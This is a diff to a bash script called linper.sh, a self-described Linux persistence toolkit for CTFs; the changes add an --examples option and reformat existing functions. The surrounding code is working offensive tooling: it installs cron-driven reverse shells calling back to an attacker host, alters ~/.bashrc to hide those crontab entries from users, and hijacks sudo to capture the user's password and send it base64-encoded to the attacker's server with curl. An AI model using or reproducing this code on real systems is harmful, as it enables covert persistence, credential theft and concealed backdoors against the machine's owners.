@@ -38,6 +38,7 @@ TMPWEB=$(echo /dev/shm/$(grep --color=never -aoE [a-zA-Z0-9] /dev/urandom | head
 INFO="linux persistence toolkit\n\nadvisory: this was developed with ctfs in mind and that is its intended use case. please do not use this tool in an unethical or illegal manner.\n"
 
 HELP="\e[33m-h, --help\e[0m show this message
+\e[33m--examples\e[0m print example commands
 \e[33m-d, --dryrun\e[0m dry run, do not install persistence, just enumerate relevant binaries
 \e[33m-e, --enum-defenses\e[0m try to enumerate any defenses relevant to installing reverse shells
 \e[33m-i, --rhost\e[0m IP/domain to call back to
@@ -45,10 +46,9 @@ HELP="\e[33m-h, --help\e[0m show this message
 \e[33m-l, --limit\e[0m number of reverse shells to install (default: all)
 \e[33m--cron\e[0m cron schedule for any reverse shells executed by crontab (default: every minute)
 \e[33m-c, --clean\e[0m removes any reverse shells installed by this program for the given RHOST
-\e[33m-s, --stealth-mode\e[0m various trivial modifications in an attempt to hide the backdoors from humans
+\e[33m-s, --stealth-mode\e[0m various trivial modifications in an attempt to hide the backdoors from humans"
 
-
-Examples:
+EXAMPLES="Examples:
 
 Enumerate binaries that can be used for persistence
     bash linper.sh -d
@@ -80,6 +80,9 @@ do
 	-h|--help)
 	    echo -e "$INFO"
 	    echo -e "$HELP"
+	    exit ;;
+	--examples)
+	    echo -e "$EXAMPLES"
 	    exit ;;
 	-d|--dryrun)
 	    shift
@@ -171,14 +174,24 @@ stealth_modifications(){
     REALBIN="$(which crontab)"
     if $(echo "$1" | grep -qi "\-l");
     then
-	if [ `$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" | wc -l` -eq 0 ];then echo no crontab for $USER; else $REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'"; fi;
-	elif $(echo "$1 | grep -qi "\-r);
+	if [ `$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" | wc -l` -eq 0 ];
 	then
-	    if $(`$REALBIN` -l | grep "'$RHOST'" | grep -qi "'$RPORT'");then `$REALBIN` -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab; else $REALBIN -r; fi;
-	    else
-		$REALBIN "${@:1}"
+	    echo no crontab for $USER
+	else 
+	    $REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'"
+	fi
+    elif $(echo "$1 | grep -qi "\-r);
+    then
+	if $(`$REALBIN` -l | grep "'$RHOST'" | grep -qi "'$RPORT'");
+	then
+	    `$REALBIN` -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab
+	else
+	    $REALBIN -r
+	fi
+    else
+	$REALBIN "${@:1}"
     fi
-}' >> ~/.bashrc && echo -e "\e[92m[+]\e[0m --stealth-mode modificaitons complete" && echo "-----------------------"
+    }' >> ~/.bashrc && echo -e "\e[92m[+]\e[0m --stealth-mode modificaitons complete" && echo "-----------------------"
 
 }
 
@@ -339,12 +352,13 @@ sudo_hijack_attack() {
 	    curl -k -s "https://'$RHOST'/$ENCODED" > /dev/null 2>&1
 	    $REALSUDO -S <<< "$PASSWD" -u root bash -c "exit" > /dev/null 2>&1
 	    $REALSUDO "${@:1}"
-	}' >> ~/.bashrc
-    echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
-    echo "[+] Password will be Stored in $TMPPASSWORDFILE"
-    echo "[+] $TMPPASSWORDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
-else
-    echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
+	    }' >> ~/.bashrc &&
+	    
+	    echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access" &&
+	    echo "[+] Password will be Stored in $TMPPASSWORDFILE" &&
+	    echo "[+] $TMPPASSWORDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
+	else
+	    echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
 	fi
 	echo "-----------------------"
     fi
